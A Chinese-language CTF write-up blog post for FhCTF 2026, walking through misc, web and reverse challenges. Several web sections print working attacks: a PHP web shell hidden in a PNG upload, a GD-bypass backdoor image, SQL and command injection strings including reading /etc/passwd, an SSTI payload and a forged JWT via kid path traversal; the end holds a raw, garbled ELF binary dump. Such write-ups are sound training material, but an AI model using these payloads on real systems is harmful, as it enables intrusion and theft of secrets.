---
title: FhCTF 11401
date: 2026-01-01
cover: /images/FhCTF.png
categories:
  - 技術分享
tags:
  - 資安
urlname: FhCTF
---
Rank 1!!! 但我只能說拉完了


<!-- more -->
``` 
2026 FhCTF / Team CTF
01.01 – 01.05

Group - --------------------------開放團訂麥當勞底下留言+1--------------------------
Final — Rank 1（Top 1）
```


## Misc

### Sanity Check
![image](/images/FhCTF/1.webp)
```
並看如何發放獎勵。

    FhCTF{S3n1ty_Ch3ck1ng....😝}

感謝本次活動 ISIP.HS 的支援與贊助。
```

### Christmas Tree
經典的霍夫曼編碼題

```pyhton=
import json

with open('encoded_gift.txt', 'r') as f:
    encoded = f.read().strip()

with open('huffman_tree.json', 'r') as f:
    huffman_tree = json.load(f)
    
def decode_huffman(encoded_data, tree):
    decoded = []
    current = tree

    for bit in encoded_data:
        current = current[bit]

        if isinstance(current, str):
            decoded.append(current)
            current = tree

    return ''.join(decoded)

decoded_message = decode_huffman(encoded, huffman_tree)
print(f"Decoded message: {decoded_message}")

```

```
FhCTF{Hoffman_is_a_great_Christmas_tree}
```
**我要吐槽一點霍夫曼編碼的英文是"Huffman"不是"Hoffman"**

### 駭客的密碼食譜

將每個食材的數值轉換成 ASCII 字元：

```
125 → }
110 → n
117 → u
102 → f
95 → _
115 → s
105 → i
95 → _
103 → g
110 → n
105 → i
107 → k
111 → o
111 → o
99 → c
123 → {
70 → F
84 → T
67 → C
104 → h
70 → F
```

```
FhCTF{cooking_is_fun}
```

### 笑話大師
**恭喜這題被評為最鳥的一題**
~~我就只是輸入一個?~~
![image](/images/FhCTF/2.webp)

```
FhCTF{thisi_Prompt_Injection}
```





### 分享圖庫
一進來我們可以看到這個介面只允許 PNG 上傳
![image](/images/FhCTF/3.webp)
發現 PNG 有固定的 8 字節標頭，那我們就可以在標頭之後添加 PHP 代碼
```
png_header = (
    b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52'
    b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4'
    b'\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00'
    b'\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE'
    b'\x42\x60\x82'
)
```
構建 PHP Payload: 嘗試多種指令讀取方式
```PHP

php_code = b'\n\n<pre>__START__\n<?php system("env || printenv"); ?>\n__END__</pre>\n'

file_content = png_header + php_code

print(f"[*] Uploading payload to {UPLOAD_URL}...")

try:
    files = {'fileToUpload': (FILENAME, file_content, 'image/png')}
    data = {'submit': 'Upload Image'}
    
    r = requests.post(UPLOAD_URL, files=files, data=data, timeout=10)
    
    if "has been uploaded" in r.text:
        print(f"[+] Upload ful!")
    else:
        print("[-] Upload failed.")
        print(f"Status Code: {r.status_code}")
        print("Response Snippet:", r.text[:300])
        sys.exit()

    exploit_url = TARGET_URL + "uploads/" + FILENAME
    print(f"[*] Executing payload at {exploit_url}...")
    
    r_exec = requests.get(exploit_url, timeout=10)
    
    if r_exec.status_code == 404:
        print("[-] Error: 404 Not Found.")
        print("    The file might have been deleted by cleanup scripts or the upload path is different.")
        sys.exit()

    content = r_exec.text


    flag_match = re.search(r'(FhCTF\{.*?\})', content)
    
    if flag_match:
        print(f"\n[] Flag found:\n{flag_match.group(1)}\n")
    else:
        start = content.find("__START__")
        end = content.find("__END__")
        if start != -1 and end != -1:
            output = content[start+9:end].strip()
            print("\n[+] Command Output (env):")
            print(output)
            if "flag" in output.lower():
                print("\n[!] 'flag' keyword found in output, please check manually above.")
        else:
            print("\n[-] Flag pattern not found automatically.")
            print("Raw response preview (check manually):")
            print(content[:500])

except requests.exceptions.ConnectionError:
    print(f"\n[-] Connection Error: Could not connect to {TARGET_URL}")
    print("    Please check if the CTF instance is still running or if the URL has changed.")
except Exception as e:
    print(f"\n[-] An error occurred: {e}")
```
```powershell
PS C:\Users\09801\Downloads\gallery> & C:/Users/09801/AppData/Local/Microsoft/WindowsApps/python3.13.exe c:/Users/09801/Downloads/gallery/test.py 
[*] Target set to: http://8608faf0.fhctf.systems/
[*] Uploading payload to http://8608faf0.fhctf.systems/upload.php...
[+] Upload ful!
[*] Executing payload at http://8608faf0.fhctf.systems/uploads/avatar.php...

[] Flag found:
FhCTF{png_format?Cannot_stop_php!}

PS C:\Users\09801\Downloads\gallery> 
```
```
FhCTF{png_format?Cannot_stop_php!}
```

### 分享圖庫 Revenge
![image](/images/FhCTF/3.webp)
目標 (Goal)： Dockerfile 第 14 行顯示 Flag 儲存在環境變數中：ENV flag="FhCTF{fake_flag}"。 因此，我們的目標是執行 PHP 程式碼來讀取環境變數（例如使用 getenv('flag') 或 $_ENV）。

漏洞入口 (Vulnerability)： upload.php 負責處理上傳。

檢查機制：它會檢查檔案是否為 PNG (exif_imagetype)，並嘗試用 GD 載入 (imagecreatefrompng)。這防止了單純的「改副檔名」或「文件尾附加 PHP 代碼」。

清洗機制 (Sanitization)：最關鍵的是第 49 行 imagepng($img, $target_file)。這會重繪圖片並存檔。一般的 Web Shell（例如在圖片結尾加 <?php system(...) ?>）經過這個步驟後，附加的代碼會被丟棄，只剩下純圖片數據。

檔名漏洞：第 7 行 $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);。伺服器直接使用了你上傳的檔名與副檔名。如果你上傳 shell.php，它就會存成 uploads/shell.php。

2. 解題思路 (Strategy)
我們需要利用 "PHP GD Bypass" 技術。 我們需要構造一個特殊的 PNG 圖片，使得它在被 imagecreatefrompng 讀取並由 imagepng 重新壓縮寫入後，新的圖片數據流中仍然包含 PHP 代碼。

這通常是透過操控 PNG 的 IDAT 塊（像素數據）來達成。當這些像素被壓縮算法處理時，會剛好組成類似 <?=$_GET[0]($_POST[1]);?> 的字串。

3. 攻擊步驟 (Step-by-Step)
第一步：生成 Payload
你需要一個腳本來生成這種「抗清洗」的 PNG。以下是一個常用的生成腳本（基於國外研究員的 IDAT/PLTE Bypass 技術）。

請將以下程式碼存為 gen_payload.php 並在你的電腦上用 PHP 執行它：

```PHP

<?php
                                                                                                        ?>

$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img, 'payload.webp');
echo "Payload generated: payload.webp\n";
?>
執行後會得到 payload.webp。這個圖片的特性是：即使經過 imagecreatefrompng 再 imagepng，裡面的 Hex 數據仍會包含 PHP 後門。
```
第二步：準備攻擊檔案
將生成的 payload.webp 重新命名為 shell.php。

伺服器檢查內容：它是合法的 PNG（通過）。

伺服器存檔：存為 .php（因為我們檔名是 .php）。

伺服器清洗：Payload 的構造特性讓它在清洗後，PHP 代碼依然存在。

第三步：上傳與執行
回到題目網頁，上傳 shell.php。



因為我們的 Payload 是 <?=$_GET[0];?>，我們可以用 GET 參數傳入指令。
```curl.exe "http://b1baf89e.fhctf.systems/uploads/shell.php?0=system" -d "1=env" --output - | Select-String "FhCTF"```

```
FhCTF{But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK}
```


### Python Compile

在程式碼錯誤時會顯示 `Syntax Error`，代表在處理錯誤時還是會讀到檔案
可以推測可能為`LFI` 題。

在程式碼輸入框隨意輸入會造成語法錯誤的 Python 程式碼並送出，頁面會顯示 `Syntax Error`，且錯誤訊息包含 "Line N" 與該行內容的回顯。

由錯誤可推測，後端在渲染 `Syntax Error` 時，會依行數讀取來源檔案的對應行內容，且讀檔目標來自使用者的 `filename`；這形成本地檔案讀取（LFI）風險。

以 PoC 驗證，將request中的 `filename` 改為system path（如 `/proc/self/environ`），同時維持語法錯誤的程式碼，觀察錯誤訊息是否顯示該檔案內容。

為了讓error出現在第 1 行，將程式碼內容設為單一 "("，backend會再嘗試讀取 `filename` 的第 1 行並顯示在error中。

```python
monaco.editor.getModels()[0].setValue("(");
```
```python
document.querySelector('input[name="filename"]').value = '/proc/self/environ';
```
```python
document.getElementById('compileForm').submit();
```

在error中可以看到 `/proc/self/environ` 的輸出，可以得到包含`FLAG=` 的 environment variable。

最後就可以拿到flag
```
FhCTF{N0t_s4f3_t0_ou7put_th3_err0r_m5g}
```


## Survey
### Survey
![image](/images/FhCTF/4.webp)
```
FhCTF{Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF}
```
## Web
### INTERNAL LOGIN
![image](/images/FhCTF/5.webp)

客戶端 SQL 注入模擬，在 Username 欄位輸入

- ' or 1=1--
- ' OR '1'='1
- admin' or 1=1--
- ' || 1=1--
- anything' or 'a'='a

```
FhCTF{SQL_1nj_42_}
```

### Web Robots
robots.txt 對，就是 robots.txt
![image](/images/FhCTF/6.webp)

可以看到有
```
User-Agent *

Disallow /secret
```

那我們就直接進/secret看吧

![image](/images/FhCTF/7.webp)

進 /secret 後會跳轉到 /secret/index.html ，那很明顯我們看的出來上一步就是目錄

![image](/images/FhCTF/8.webp)

![image](/images/FhCTF/9.webp)

```
FhCTF{r0b075_4r3_n0t_v15ible_in_tx7}
```

### Doors Open

![image](/images/FhCTF/10.webp)

一樣先看 robots.txt

![image](/images/FhCTF/11.webp)

那就進 /doors 看看吧

![image](/images/FhCTF/12.webp)

這裡點開直接是 /door/1 ， 那我們就開始用Burp跑0~10000，發現都不是，
看著越來越多人解，就想說應該沒那麼難吧，所以就想說會不會是負數....

![image](/images/FhCTF/13.webp)

### The Visual Blind Spot


計算正確的 RGB 密鑰
```javascript
const _base = parseInt("32", 16); // "32" (十六進位) = 50 (十進位)

const _kMap = { 
    x: _base << 1,  // 50 << 1 = 100
    y: _base,       // 50
    z: _base << 2   // 50 << 2 = 200
};
```
正確的 RGB 值：
```
R = 100

G = 50

B = 200
```
解密 sys-config 數據
data-params 包含加密的數據：

```text
249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414
```
解密公式：charCode = (n / 3) - 13

```
FhCTF{Stn3am_C1ph3p}
```


### SYSTEM ROOT SHELL

![image](/images/FhCTF/14.webp)


在 script 標籤中發現

```
javascript
const _obs = [82, 67, 69, 95, 83, 117, 99, 99, 101, 115, 115, 95, 118, 51]; 
const _h = [70, 104, 67, 84, 70, 123]; 
const isInject = /[;&|]/.test(cmd);
```

ASCII 碼數組轉換為字元
```
_h → "FhCTF{"

_obs → "RCE__v3"

最後加上 "}"
```
觸發方式
```powershell
127.0.0.1; ls

127.0.0.1 | whoami

127.0.0.1 & cat /etc/passwd
```
```
FhCTF{RCE__v3}
```

### Welcome to Cybersecurity Jungle
![image](/images/FhCTF/15.webp)
一進來會看到上面的畫面，看 HTML source時,注意到 title 標籤包含一段日文
```
言語（げんご）を変（か）えても、プログラミングの本質（ほんしつ）は変（か）わらない。
```
意旨 "即使改變語言，編程的本質也不會改變

題目的關鍵在於設置正確的 Cookie
```
Cookie 名稱 (Base64 編碼): aXNGbGFnU2hvdzJ1
```
解碼後:  `isFlagShow2u`
```
Cookie 值 (Base64 編碼): 44Go44GF44KL44O8
```
解碼後: `とぅるー (日文的 "true")`

接下來進到 Application 改 cookie 值後重新整理即可

![image](/images/FhCTF/16.webp)

```
FhCTF{Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d}
```

### Templating Danger

SSTI題

繞過方法:
```python
if "\\u" in val:
    normalize_val = val.encode("utf-8").decode('unicode_escape')
    context[context_key] = Template(normalize_val).render()
```
當輸入包含 \u 時，系統會執行 Unicode 解碼，然後在過濾後直接用 Jinja2 的 Template().render() 渲染內容。這允許我們使用 Unicode 編碼繞過括號過濾。

Payload:
```python
\u007b\u007bcycler.__init__.__globals__.os.environ['FLAG']\u007d\u007d
```
![image](/images/FhCTF/17.webp)
```
FhCTF{T3mpl371ng_n33d_t0_b3_m0r3_c4r3full🥹}
```

### Documents
一進來看照慣例看sources，找出隱藏字元
![image](/images/FhCTF/18.webp)
- "HTTP Header 告訴了你一切"

檢查 HTTP 標頭發現: powerby: FastAPI
FastAPI 通常有 /openapi.json 端點
![image](/images/FhCTF/19.webp)
可以發現 /flag.html 端點需要 Referer 標頭，所以我們需要偽造他

```powershell
Invoke-WebRequest -Uri "http://9f1604e5.fhctf.systems/flag.html" `
    -Headers @{"Referer"="https://localhost.app:8000/index.html"} `
    -UseBasicParsing | Select-Object -ExpandProperty Content
```

![image](/images/FhCTF/20.webp)
```
FhCTF{URL_encod3d_m337_p47h_d15cl0sure😱😱}
```

### LOG ACCESS
![image](/images/FhCTF/21.webp)

這題提供了一個「安全的日誌讀取工具」，聲稱能偵測並阻擋所有 Path Traversal 攻擊 。題目明確提示：這個工具完全沒有後端，所有判斷似乎都在瀏覽器中完成。

```javascript
const check1 = input.split('.').length > 3;
const check2 = input.toLowerCase().indexOf('flag') !== -1;

if (check1 && check2) {
    const final = _h + "{" + _c1 + _c3 + "_" + _c2 + "}";
    output.innerText = "ACCESS_GRANTED:\n" + final;
}
```
驗證條件非常清楚：

- check1：輸入必須包含超過 3 個點（. 字元）
- check2：輸入必須包含 "flag" 字串（不區分大小寫）

混淆字串解碼
JavaScript 中使用了幾個混淆的變數 ：

```javascript
const _h = [70, 104, 67, 84, 70].map(c => String.fromCharCode(c)).join('');
// ASCII 解碼：FhCTF

const _c1 = "\x50\x61\x74\x68\x5f";
// Hex 解碼：Path_

const _c2 = (21337 >> 4).toString(16);
// 位元運算：21337 >> 4 = 1333，轉 hex = 535

const _c3 = "\x54\x72\x34\x76";
// Hex 解碼：Tr4v
```
組合起來
```
FhCTF{Path_Tr4v_535}
```

### Pathway-leak
打開題目網站，觀察檔案管理介面與網頁原始碼。
![image](/images/FhCTF/22.webp)

在 `<script>` 區塊中發現檔案載入是呼叫：

```javascript
const TENANT = 'guest_user';
const url = `/api/assets/${TENANT}/${filename}`;
```
題目另外提供的檔案清單顯示伺服器上還存在：
```
secret_admin/flag.txt (38B)
```
推論後端 API 很可能沒有檢查目前使用者是否真的屬於該 tenant，因此直接嘗試跨 tenant 請求：

```bash
curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt
```

伺服器回應 HTTP 200，內容為：
```
FhCTF{p4th_tr4v3rs4l_w3_w4n7_t0_av01d}
```

### KID
進入題目網頁後，先打開瀏覽器的「檢查元素 / 開發者工具」，在原始碼與 console/log 區可以看到幾段 Debug 訊息，直接洩漏了後端的驗證邏輯：

- 金鑰路徑 Debug：
  ```txt
  [DEBUG] Fetching key from: /app/keys/default.pem
  ```
  這代表伺服器會根據 JWT Header 裡的 `kid`（Key ID）去檔案系統讀取金鑰，例如 `kid = "default.pem"` 對應 `/app/keys/default.pem`。

- 危險的相容模式：
  ```txt
  [DEBUG] HS256 Compatibility Mode: Enabled
  ```
  這表示伺服端在驗證 JWT 時，同時支援非對稱（RS256）與對稱（HS256）模式，而且實作方式存在演算法混淆風險。

- 目前權限：頁面顯示登入身份為 `guest`，顯然目標是偽造 Token 取得 `admin` 權限。

接著從 Cookie 中取出 JWT（例如 `access_token`），丟到 jwt.io 觀察內容，可以得到類似結構：

- Header：
  ```json
  {
    "alg": "RS256",
    "kid": "default.pem",
    "typ": "JWT"
  }
  ```
- Payload：
  ```json
  {
    "role": "guest",
    "iat": 1704350000
  }
  ```

這些資訊已經足夠判斷：伺服器會依 `kid` 去讀檔案，並用其中內容當作金鑰來驗證 JWT。

- 漏洞原理分析

這題結合了兩個常見錯誤：**Directory Traversal** + **JWT Algorithm Confusion**。

- Directory Traversal (目錄遍歷)

    後端實作概念大致類似：

    ```python
    kid = header["kid"]
    key_path = "/app/keys/" + kid
    key_data = open(key_path, "rb").read()
    ```

    若 `kid` 沒有過濾 `../`，攻擊者可以傳入像是：

    ```txt
    ../../../../../../dev/null
    ```

    讓伺服器實際去開啟的路徑變成 `/dev/null`，而不是預期的 `/app/keys/default.pem`。  
    雖然我們看不到檔案內容，但伺服器會「自己」幫我們載入，並當成金鑰使用，這就是利用點。

- JWT Algorithm Confusion (演算法混淆)

    預期設計應該是：

    - 使用 `RS256`：  
      - 使用非對稱金鑰（private key 簽發、public key 驗證）。
      - `.pem` 應該被視為「公鑰」，只能用來驗證 Signature。

    但現在伺服器支援 `HS256 Compatibility Mode`，實作類似：

    ```python
    if header["alg"] == "RS256":
        # 用 public key (pem) 驗證
    elif header["alg"] == "HS256":
        # 仍然讀同一個 pem 檔案，但把整個內容當成 HMAC secret
    ```

    結果變成：

    - 當 `alg = HS256` 時，伺服器會把「原本是公鑰的 pem 檔內容」當成對稱金鑰（secret）來驗證 HMAC。
    - 只要攻擊者「知道」這個 secret，就能在外面自己簽 Token。

    問題是：`default.pem` 的內容我們不知道，所以沒辦法直接利用；但目錄遍歷讓我們可以選擇「其他檔案」來當 secret。

- 攻擊思路設計

    關鍵想法：

    1. 找一個「內容已知」的系統檔案，讓伺服器把它讀進來當 HMAC secret。
    2. 對 Linux 來說，`/dev/null` 的內容就是空的，所以可以預期：
       - 程式讀取 `/dev/null` ⇒ 讀到空字串 `""`。
    3. 只要我們在本地端用「空字串」當 secret，就能產出與伺服器一致的 HS256 簽章。
    4. 再把 Payload 裡的 `role` 改成 `admin`，就可以偽造一個被伺服器接受的管理員 Token。

    因此攻擊步驟是：

    - 把 JWT Header 的：
      - `alg` 改為 `HS256`
      - `kid` 改為 `../../../../../../dev/null`
    - 用 `key = ""` （空字串）簽 HMAC-SHA256，產生新的 Token。
    - 將 Payload 中 `role` 改成 `admin`、甚至 `user` 改成 `admin`，達成提權。


- 實作 Exploit（偽造 JWT）

    以下使用 Python + PyJWT 生成偽造 Token：

    ```python
    import jwt

    # 1. 惡意 Header：目錄遍歷指向 /dev/null，改用 HS256
    headers = {
        "kid": "../../../../../../dev/null",
        "alg": "HS256",
        "typ": "JWT"
    }

    # 2. 惡意 Payload：直接把角色改成 admin
    payload = {
        "role": "admin",
        "user": "admin",
        "iat": 1704355555
    }

    # 3. 簽名：密鑰為空字串，對應伺服器讀取 /dev/null 的結果
    forged_token = jwt.encode(
        payload,
        key="",
        algorithm="HS256",
        headers=headers
    )

    print("偽造的 Token:\n", forged_token)
    ```

    步驟：

    1. 從原本 Cookie 拿到合法 JWT，確認欄位名稱（例如 `role`、`user` 等）。
    2. 執行腳本，得到一個新的 `forged_token` 字串。
    3. 在瀏覽器中：
       - F12 → Application → Cookies。
       - 找到原本存 JWT 的 Cookie（例如 `access_token`）。
       - 將其值整個替換為 `forged_token`。
    4. 重新整理頁面。

    若後端如題目描述那樣實作，伺服器會：

    - 看到 `alg = HS256` → 用 HMAC 模式驗證。
    - 看到 `kid = ../../../../../../dev/null` → 讀取 `/dev/null` 當作 secret（空字串）。
    - 用空字串驗證 HMAC Signature，因為我們本地端也是用空字串簽的，所以驗證會通過。
    - Payload 裡 `role = admin`，因此認定我們是管理員。
![image](/images/FhCTF/23.webp)
![image](/images/FhCTF/24.webp)

```
FhCTF{Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5}
```

### Something You Put Into

檢視 `main.py`，可知flag是由系統設定取出：
```python
FLAG = ChallSettings().flag
```
確認 `ChallSettings()` 會從 env variable 中讀取 Flag。

檢查 Docker YAML 設定檔，可發現 Flag 以 plain text 形式存在環境變數設定中。

```
FhCTF{🐷B3_c4r3ful_y0ur_SQL_synt4x🐷}
```


## Reverse
### 簡易腳本閱讀器
- 先看PY，從第 2 行開始,跳過了 Flag
![image](/images/FhCTF/25.webp)
- 用戶輸入可以修改列表中的任何位置
![image](/images/FhCTF/26.webp)
- JUMP 指令可以改變指令指針到任何索引
![image](/images/FhCTF/27.webp)
那其實我們直接輸入 "JUMP 0" 就好了
![image](/images/FhCTF/28.webp)
```
FhCTF{f1l3_10_and_jumb_m4st3r}
```

### OBF
先看code，使用了大量的混淆技術:

- 變數單字母命名 (K, H, G, J, C 等)
- 簡化的內置函數 (A=enumerate, E=chr, F=ord)
- 狀態機設計 (使用字典和指針)
- 魔法數字和字符串

code實現了一個狀態機,按以下順序執行:

```text
狀態 1: XOR 66 解碼
  資料: [58,34,118,...,34]
  結果: '|`0|`.T1W0.`,`k`'
  
狀態 5: 字符串反向
  資料: 'wEGLxxnj0nbU2fsm'
  反向: 'msfU2bn0jnxxLGEw'
  
狀態 2: Base64 解碼
  資料: 'WEVBVldCWkM1UVBWQktHeA=='
  解碼: 'XEAVWBZC5QPVBKHX'
  
狀態 3: 字符減 5
  資料: 'GFVzRJI9IctWCFa['
  結果: 'BAQuMED4D^oR>A\V'
  
狀態 4: 驗證完成
  檢查密鑰長度 >= 64 ✓
  完整密鑰 (64 字符)
```
```text
|`0|`.T1W0.`,`k`BAQuMED4D^oR>A\VXEAVWBZC5QP...
```
這個密鑰是通過 4 部分組合而成:

- XOR with 66: |0|.T1W0.,`k` (16 字符)
- 字符 - 5: BAQuMED4D^oR>A\V (16 字符)
- Base64 解碼: XEAVWBZC5QPVBKHX (16 字符)
- 字符串反向: msfU2bn0jnxxLGEw (16 字符)

解密過程
給定的加密輸出:

```text
3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b
```
使用密鑰進行 XOR 解密:

```python
flag = ''.join([chr(int(hex_pair, 16) ^ ord(key[i % 64]))
               for i, hex_pair in enumerate(hex_pairs)])
```
```
FhCTF{P0lym0rph1c_Crypt0}
```

### The Lock

使用 IDA 靜態分析
#### 主函數 (main) 邏輯
透過 IDA Pro 反編譯後，可以看到 main 函數的流程如下：
格式檢查 (check_header)：檢查輸入是否以 FhCTF{ 開頭並以 } 結尾。
核心驗證 (check_password)：這是最關鍵的函數，若回傳值為真，則代表 Flag 正確。
#### 驗證函數 (check_password) 分析
進入 check_password 函數後，可以觀察到以下關鍵點：
字串處理：程式使用 substr 提取了花括號內的內容。
長度限制：內容長度必須正好為 26 個字元。
關鍵數據：
v6 (金鑰陣列): [85, 51, 102, 17]
v7 (目標數值陣列): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
演算法公式：
$$v7[i] = (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i$$






#### 演算法還原與逆向
為了得到原始輸入，我們需要將上述公式進行移項，反推 $\text{input}[i]$：
先處理加法偏移：$X = v7[i] - 2 \times i$
再處理異或運算：$\text{input}[i] = X \oplus v6[i \pmod 4]$
自動化解密腳本 (Python)
為了快速得到結果，我們編寫以下腳本：
```Python
target = [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
key = [85, 51, 102, 17]

flag_content = ""
for i in range(len(target)):
    # 逆向公式：(v7[i] - 2*i) XOR v6[i%4]
    char_code = (target[i] - 2 * i) ^ key[i % 4]
    flag_content += chr(char_code)

print(f"Flag: FhCTF{{{flag_content}}}")
```

#### 最終結果
經過腳本執行，花括號內的字串為 J3v3rs3_Eng1n33r1ng_1sOar7。
Flag 內容分析：該字串是 Leet Speak 形式的「Reverse Engineering Is Art」。

最終答案：
```
FhCTF{R3v3rs3_Eng1n33r1ng_1s_Ar7}
```

### 壞掉的解碼器
給了兩個檔案
![{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}](/images/FhCTF/a.webp)
其中encrypted_flag裡有
![{58654F7F-3F17-4FA5-AEAC-649927D2FA73}](/images/FhCTF/b.webp)
decrypt裡有
```
ELF          >          @       ?          @ 8 
 @         @       @       @       ?      ?                                                                                        ?      ?                                        !       !                                                                     X-      X=      X=      ?      @                   h-      h=      h=                                 8      8      8      0       0                    h      h      h      D       D              S廞d   8      8      8      0       0              P廞d   d       d       d       \       \              Q廞d                                                  R廞d   X-      X=      X=      ?      ?             /lib64/ld-linux-x86-64.so.2               GNU   ?           ?                   GNU e諲p6N)L？         GNU                                 ?!            胗姲r?%mC慝驧?C                        {                     d                      ?                     ?                      ?                     ?                      d                     u                     ?                     ?                      ^                     F                                                                    ,                       ?                     ?  "                   ?     `A            ?     B              "  ?      ?       T    @@             __gmon_start__ _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable _ZSt17__istream_extractRSiPcl _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ _ZSt3cin _ZNSolsEPFRSoS_E _ZSt4cerr _ZSt21ios_base_library_initv _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _ZSt4cout fgets __stack_chk_fail fopen strlen __isoc23_strtol __libc_start_main __cxa_finalize fclose fputc libstdc++.so.6 libc.so.6 GLIBCXX_3.4.29 GLIBCXX_3.4.32 GLIBCXX_3.4 GLIBC_2.38 GLIBC_2.4 GLIBC_2.34 GLIBC_2.2.5                                ?     @   y?    ?     B?   ?     t)?   ?        ?         ??        ii
        ??        ui	   #      X=             `      `=                    @             @      ?                    ?                    ?                    ?         
           ?                    ?                    @@                    `A                    B                    ?                     ?                     ?                     ?                     ?                      ?                     ?          	           ?                     ?                     ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ?H??  Ht粀?     5J/  %L/  @ ?    殪f   橏f   樲f   斢f   憸f   ?f   ?f    廨f   嶵f	   嬙f?%?  fD  ??%?  fD  ??%?  fD  ??%?  fD  ??%~.  fD  ??%v.  fD  ??%n.  fD  ??%f.  fD  ??%^.  fD  ??%V.  fD  ??%N.  fD  ??檌^HH癚TE1?亍??  ;.  灀.?     H?Y.  H?R.  H9黂H?.  Ht	?    ?    H?).  H?".  H)H鍔?H霞H韆毤tH??  Ht趒D  ?    ??=e1   u+UH??   HtH??  ??鋄?=1  ]? ?    ?w?HH轣? i鴦N艷90  %H?H? ]鏤HH駍E?    ??釓?)?禧?? 壁?E?H?? u?E鏤H?E?貸?E?輾???貸   +E?輾??礑鏤HH H輤輤霂?H齴H轣H輤陊  H?H? t,H轣H輤?? <
t妲轣H輤?? <
t?卍?HHP  dH?%(   H?隨?[  HH??  H??H?蹥HH??  H噮  H?:  HH?[,  H??H?蹧HH?b-  H駉  H?蹥H?  HH??H?瞰H瞰 u5H??  HH??.  H閫?H??  HH韏??   嬐  H?瞰H?媻?   H駗?HtH?瞰H銶??   ?  H?媻H鋃?H?瞰H?膣?   H??Ht ?膣 H?膣H??H?瞰H??H?蹧H?9  HH??H?H u5H?  HH?I-  H鞊?H??  HH餈??   嶧  H?膣H???渾f?渮  ?軷 H?媻H遯?H?唅H?軾    濎   H?媻H?軾H?? ?渮H?軾H?媻?缿H?渮?   ?    H鋓??欲?欲?荻?欲?   駏??欲H?渾H???H純H錘 錘 鎂)?????壺0??荻?渾???欲H?H韐?H?軾H?軾H;??H?H輘??    H鷣H+%(   t遰?卍?HH H輤詡?H轣轣詡輤H鄫?H駓?   ?H?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Input Filename:  Output Filename:  r Error opening input file. w Error opening output file.  ;X   
   潘?   l??   |??   ?t   ??   7?  |?$  梃D   ?d  n??         zR x ?        &    D     $   4   (??    FJw ?9*3$"       \   堆              t   剁?              ?   ?2    E?C
i       ?   +?E    E?C
|       ?   P?5    E?C
l       ?   e?o    E?C
f        渤N   E?C
E     ,  碠?    E?C
v                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    `                    ?             ?                    
                    X=                           `=                    蘥o    ?             ?             ?      
       /                                          h?             ?                             
              ?                    	                            ?o          ?o    X      o           ?o    (      ?o                                                                                           h=                      0      @      P      `      p            ?      ?      ?      ?                                                              @      GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0                                  ?                	     ?                  ?                     ?                    ?              3                    I                  U     `=              |     `              ?     X=              ?    ?                ?     `              ?     a                  b                  ?                L    "                   ?                Z     d               m    h=              v    h?              ?  "  ?      ?       ?    @              ?      @              ?                   ?  "                   ?                         ?      N                           X   @              e          o       y                                      ?          &       ?    ?      5       ?                     ?                                          "    i      2       3                     N                  T   @              `                     r                     ?    @@            ?    ?      E       ?     @              ?                  ?    @@              ?                     ?                     
